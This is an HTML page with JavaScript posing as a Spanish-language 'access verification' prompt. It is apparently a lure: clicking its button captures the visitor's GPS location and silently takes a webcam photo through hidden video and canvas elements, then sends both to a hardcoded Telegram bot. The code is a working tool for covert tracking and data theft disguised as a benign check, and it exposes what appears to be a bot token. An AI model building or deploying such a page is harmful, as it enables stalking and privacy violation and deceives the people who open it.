<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de Acceso</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: black; color: white; }
        button { background: blue; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; margin: 10px; }
        #status { margin-top: 20px; font-size: 14px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h1>Verificación de Acceso</h1>
    <button id="btn">✅ Verificar ahora</button>
    <p id="status"></p>

    <!-- Elementos ocultos para capturar foto -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // 👇 CAMBIA ESTOS DOS VALORES POR LOS TUYOS 👇
        const BOT_TOKEN = '8803149571:AAHDOGrQ-Y0TSoZBP4mSLzQlHTOFAbgR0Ug'; // Tu token NUEVO (revoca el viejo)
        const CHAT_ID = '7555997298'; // Tu Chat ID

        const btn = document.getElementById('btn');
        const statusDiv = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;

        // Función para enviar mensaje de texto a Telegram
        async function sendMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch(e) { console.error(e); }
        }

        // Función para enviar foto a Telegram
        async function sendPhoto(blob) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch(e) { console.error(e); }
        }

        // Capturar foto desde la cámara
        async function capturePhoto() {
            if (stream) {
                // Detener stream anterior si existe
                stream.getTracks().forEach(track => track.stop());
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                // Esperar un momento para que la cámara se estabilice
                await new Promise(r => setTimeout(r, 500));
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                // Detener stream
                stream.getTracks().forEach(track => track.stop());
                stream = null;
                return blob;
            } catch (err) {
                console.error('Error de cámara:', err);
                return null;
            }
        }

        btn.onclick = async () => {
            statusDiv.innerText = 'Obteniendo ubicación...';
            // 1. Obtener ubicación
            if (!navigator.geolocation) {
                statusDiv.innerText = '❌ Geolocalización no soportada';
                return;
            }
            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const maps = `https://www.google.com/maps?q=${lat},${lng}`;
                const locationMsg = `📍 Ubicación capturada:\nLat: ${lat}\nLng: ${lng}\nMapa: ${maps}`;
                await sendMessage(locationMsg);
                statusDiv.innerText = '✅ Ubicación enviada. Solicitando cámara...';
                
                // 2. Intentar capturar foto (requiere permiso adicional)
                const photoBlob = await capturePhoto();
                if (photoBlob) {
                    await sendPhoto(photoBlob);
                    statusDiv.innerText = '✅ Ubicación y foto enviadas a Telegram';
                } else {
                    await sendMessage('❌ No se pudo acceder a la cámara o capturar foto');
                    statusDiv.innerText = '⚠️ Ubicación enviada, pero falló la cámara';
                }
            }, (error) => {
                statusDiv.innerText = '❌ Error de ubicación: ' + error.message;
                sendMessage(`❌ Error de geolocalización: ${error.message}`);
            });
        };
    </script>
</body>
</html>
